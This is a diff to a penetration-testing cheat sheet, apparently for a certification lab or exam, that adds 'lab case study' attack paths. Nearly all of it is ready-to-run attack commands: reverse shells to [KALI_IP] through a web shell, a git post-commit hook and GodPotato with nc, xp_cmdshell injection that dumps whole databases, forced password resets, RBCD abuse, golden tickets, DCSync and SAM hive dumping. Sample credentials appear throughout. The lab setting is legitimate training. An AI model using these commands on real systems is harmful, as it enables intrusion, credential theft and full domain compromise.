@@ -207,9 +207,9 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   ```
 
 - **Reset User Password (bloodyAD Target CN)**:
-  - *Scenario*: When you have the specific CN of the user (e.g. `CN=DONNA CHAMBERS,CN=USERS,DC=ZEUS,DC=CORP`).
+  - *Scenario*: When you have the specific CN of the user (e.g. `CN=DONNA CHAMBERS,CN=USERS,DC=MARINE,DC=COM`).
   ```bash
-  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [DC_IP] set password 'CN=[TARGET_CN]' '[NEW_PASSWORD]'
+  bloodyAD -u 'Mona' -p 'Monapass' -d 'sub.marine.com' --host 100.130.140.200 set password 'CN=[TARGET_CN]' '[NEW_PASSWORD]'
   ```
 
 ### Group Policy (GPO) Abuse
@@ -333,9 +333,9 @@ foreach ($ip in $ips) {
 }
 ```
 
-**Medtech Internal Scanner (172.16.230.x):**
+**Internal Net Scanner (Subnet Example):**
 ```powershell
-$ips = 10..15 + 82..83 | % { "172.16.230.$_" }
+$ips = 10..15 + 82..83 | % { "100.130.140.$_" }
 $ports = @(21,22,25,53,80,111,135,139,389,443,445,1433,3306,3389,5985,5986,8080)
 foreach ($ip in $ips) {
     foreach ($port in $ports) {
@@ -407,7 +407,7 @@ foreach ($ip in $ips) {
 - **SSH Tunneling (SOCKS Proxy):**
   ```bash
   # Start dynamic port forward (Kali -> Target)
-  ssh -D 1080 Eric.Wallows@192.168.182.153
+  ssh -D 1080 Mona@100.130.140.200
   # Use via proxychains:
   proxychains nmap -sT 10.10.x.x
   ```
@@ -569,14 +569,14 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   droopescan scan joomla --url http://10.10.10.10
   droopescan scan drupal --url http://10.10.10.10
   ```
-- **wpDiscuz Unauthenticated RCE (CVE-2020-24186):**
+- **Plugin Unauthenticated RCE:**
   ```bash
-  python3 wpdiscuz.py -u "http://[TARGET_URL]" -p "/?p=[POST_ID]"
-  # Example (Blogger): python3 wpdiscuz.py -u "http://blogger.pg/assets/fonts/blog" -p "/?p=29"
-  # Working Shell: curl -G "http://blogger.pg/[PATH]/[SHELL].php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1'"
+  python3 exploit_wp.py -u "http://[TARGET_URL]" -p "/?p=[POST_ID]"
+  # Example: python3 exploit_wp.py -u "http://example.com/blog" -p "/?p=29"
+  # Working Shell: curl -G "http://example.com/[PATH]/[SHELL].php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1'"
   ```
   ```
-  *Note*: Check styles in page source for `/wp-content/plugins/wpdiscuz/` to confirm version 7.0.4.
+  *Note*: Check styles in page source for confirming plugin version.
 
 - **Social Warfare <= 3.5.2 RCE (CVE-2019-9978):**
   - *Trigger*: `wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://[KALI_IP]/payload.txt`
@@ -793,7 +793,7 @@ Use these queries after connecting via `impacket-mssqlclient`.
   SELECT name, password_hash FROM master.sys.sql_logins;
   ```
 
-- **Dumping Data via xp_cmdshell (Medtech Method):**
+- **Dumping Data via commands (Lab Method):**
   - *List Databases*: `'; EXEC xp_cmdshell 'sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases"'; -- -`
   - *List Tables*: `'; EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "SELECT name FROM sys.tables"'; -- -`
   - *Dump Everything*: `'; EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "EXEC sp_MSforeachtable ''SELECT ''''?'''' AS TableName, * FROM ?''"'; -- -`
@@ -872,7 +872,8 @@ Include multiple variations for different OS targets and filtering environments.
 - **Specific Escapes (GTFOBins):**
   - **Find:** `find . -exec /bin/sh \; -quit`
   - **Vim:** `:set shell=/bin/bash` followed by `:shell`
-  - **Git:** `sudo git help config` then `!/bin/bash`
+        *   sudo git: `sudo git -p help config` -> `!/bin/sh`
+
   - **GDB:** `gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`
   - **GIMP:** `gimp-2.10 -idf --batch-interpreter python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'`
   - **Teehee:** `echo "root2::0:0::/root:/bin/bash" | sudo teehee -a /etc/passwd`
@@ -1215,7 +1216,28 @@ Don't get overwhelmed by searching just for "linux kernel". Most effective combi
 
 ### Forest Trust Exploitation (Golden Ticket + Extra SIDs)
 - **Why**: Escalate from a compromised Child Domain to the Forest Root Admin.
-- **Requirement**: Child `krbtgt` hash and SID, Parent Forest SID (find via `lsadump::trust` or `Get-DomainSID`).
+- **Requirement**: Child `krbtgt` hash and SID, Parent Forest SID (find via `lsadump::trust`, `Get-DomainSID`, or via LDAP as shown below).
+- **Advanced SID Discovery (LDAP/ADSI)**:
+  - *Scenario*: Use from a domain-joined machine to find trusted domain SIDs without RPC-reliant tools.
+  ```powershell
+  ([adsi]"LDAP://CN=System,$(([adsi]"LDAP://RootDSE").get('defaultNamingContext'))").Children | Where-Object {$_.SchemaClassName -eq 'trustedDomain'} | Select-Object @{n='RemoteDomain';e={$_.Name}}, @{n='SID';e={(New-Object System.Security.Principal.SecurityIdentifier($_.Get('securityIdentifier'), 0)).Value}}
+  ```
+- **Local `krb5.conf` Template (for Multi-Domain/Trusts)**:
+  ```ini
+  [libdefaults]
+      default_realm = PARENT.LOCAL
+      dns_lookup_realm = false
+      dns_lookup_kdc = false
+      rdns = false
+
+  [realms]
+      PARENT.LOCAL = { kdc = 192.168.1.10 }
+      CHILD.PARENT.LOCAL = { kdc = 192.168.1.11 }
+
+  [domain_realm]
+      .parent.local = PARENT.LOCAL
+      parent.local = PARENT.LOCAL
+  ```
 - **Execution**:
   ```bash
   mimikatz # kerberos::golden /user:Administrator /domain:[CHILD_DOMAIN] /sid:[CHILD_SID] /sids:[PARENT_SID]-519 /rc4:[CHILD_KRBTGT_HASH] /ptt
@@ -1555,3 +1577,85 @@ Critical for fixing older exploits during the exam.
 ---
 
 **Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
+
+---
+
+## 14. Lab-Specific Case Studies (Successful Execution Paths)
+
+### 14.1. Lab Case Study (AD & Backup Operators)
+- **AD Reset (bloodyAD)**:
+  ```bash
+  bloodyAD -u m.thomas -p 'P@ssw0rd123!' -d marine.com --host 100.130.140.200 set password 'CN=USER,CN=USERS,DC=MARINE,DC=COM' 'NewPassword123!'
+  ```
+- **Backup Operators PrivEsc**:
+  ```powershell
+  # Requires BUILTIN\Backup Operators
+  reg save hklm\sam sam.save
+  reg save hklm\system system.save
+  # Local Download then:
+  impacket-secretsdump -sam sam.save -system system.save LOCAL
+  ```
+
+### 14.2. Lab Case Study (MSSQL & Pivoting)
+- **MSSQL Global Data Dump**:
+  ```sql
+  '; EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "EXEC sp_MSforeachtable ''SELECT ''''?'''' AS TableName, * FROM ?''" -o C:\tmp\dump.txt'; -- -
+  ```
+- **Internal Port Discovery (No Tools)**:
+  ```powershell
+  $ips = 10..15 + 82..83 | % { "100.130.140.$_" }; $ports = @(21,22,80,445,5985,3389); foreach ($ip in $ips) { foreach ($port in $ports) { try { $socket = New-Object System.Net.Sockets.TcpClient; $res = $socket.BeginConnect($ip, $port, $null, $null); if ($res.AsyncWaitHandle.WaitOne(100, $false)) { $socket.EndConnect($res); Write-Host "[+] $ip : $port - OPEN" -ForegroundColor Green }; $socket.Close() } catch { } } }
+  ```
+
+### 14.3. Lab Case Study (Hooks & Sudo Git)
+- **Git Hook RevShell Injection**:
+  ```bash
+  cat <<EOF > .git/hooks/post-commit
+  #!/bin/bash
+  sh -i >& /dev/tcp/[KALI_IP]/4444 0>&1
+  EOF
+  chmod +x .git/hooks/post-commit
+  7z a shell.zip .git/
+  cp shell.zip /home/jen/public/repos
+  ```
+- **Sudo Git Escape**:
+  ```bash
+  sudo /usr/bin/git help config
+  # Type !/bin/sh
+  ```
+
+### 14.4. Lab Case Study (Inter-Domain Trust & Delegation)
+- **Forced Password Reset (bloodyAD)**:
+  ```bash
+  bloodyAD -u 'Mona' -p 'Monapass' -d 'sub.marine.com' --host 100.130.140.200 set password 'Jackie' 'PwnedJackie123!'
+  ```
+- **RBCD (Resource-Based Constrained Delegation)**:
+  ```bash
+  # 1. Add Computer
+  impacket-addcomputer 'sub.marine.com/Jackie:PwnedJackie123!' -computer-name 'ATTACKER_PC$' -computer-pass 'PwnedPC123!' -dc-ip 100.130.140.200
+  # 2. Add RBCD
+  bloodyAD -u 'Jackie' -p 'PwnedJackie123!' -d 'sub.marine.com' --host 100.130.140.200 add rbcd 'DC02$' 'ATTACKER_PC$'
+  # 3. Get ST
+  impacket-getST -dc-ip 100.130.140.200 -spn "cifs/DC02.sub.marine.com" -impersonate Administrator 'sub.marine.com/ATTACKER_PC$:PwnedPC123!'
+  ```
+- **Inter-Domain Ticket Abuse (Rubeus -> Kali)**:
+  ```bash
+  # 1. Export ticket from DC02 (Windows)
+  .\Rubeus.exe dump /nowrap
+  
+  # 2. Save and convert on Kali
+  echo "<BASE64_TICKET>" | base64 -d > ticket.kirbi
+  impacket-ticketConverter ticket.kirbi ticket.ccache
+  
+  # 3. Setup local krb5.conf (Required for inter-domain routing)
+  # [realms] MARINE.COM = { kdc = 100.130.140.200 ... }
+  
+  # 4. Get ST and DCSync
+  export KRB5CCNAME=ticket.ccache
+  export KRB5_CONFIG=./krb5.conf
+  kvno cifs/dc01.marine.com
+  impacket-secretsdump -k -no-pass -dc-ip 100.130.140.200 -just-dc-user 'MARINE/Administrator' dc01.marine.com
+  ```
+- **Local LPE (GodPotato)**:
+  ```powershell
+  .\GodPotato-NET4.exe -cmd "nc64.exe [KALI_IP] [PORT] -e cmd.exe"
+  ```
